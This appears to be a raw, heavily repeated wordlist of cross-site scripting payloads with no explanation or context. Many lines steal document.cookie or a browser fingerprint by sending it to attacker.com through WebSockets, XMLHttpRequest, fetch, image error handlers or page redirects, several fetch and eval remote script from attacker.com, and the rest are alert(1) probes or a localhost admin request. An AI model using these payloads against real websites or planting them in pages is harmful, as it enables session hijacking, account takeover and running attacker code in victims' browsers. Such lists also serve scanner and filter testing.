<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<svg onload="alert(1)"></svg>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<svg onload="alert(1)"></svg>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<svg onload="alert(1)"></svg>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<svg onload="alert(1)"></svg>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<svg onload="alert(1)"></svg>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<svg onload="alert(1)"></svg>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<svg onload="alert(1)"></svg>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<svg onload="alert(1)"></svg>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<svg onload="alert(1)"></svg>
<svg onload="alert(1)"></svg>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<svg onload="alert(1)"></svg>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<svg onload="alert(1)"></svg>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<svg onload="alert(1)"></svg>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<svg onload="alert(1)"></svg>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<svg onload="alert(1)"></svg>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<svg onload="alert(1)"></svg>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<svg onload="alert(1)"></svg>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<div style="background-image: url('javascript:alert(1)')"></div>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
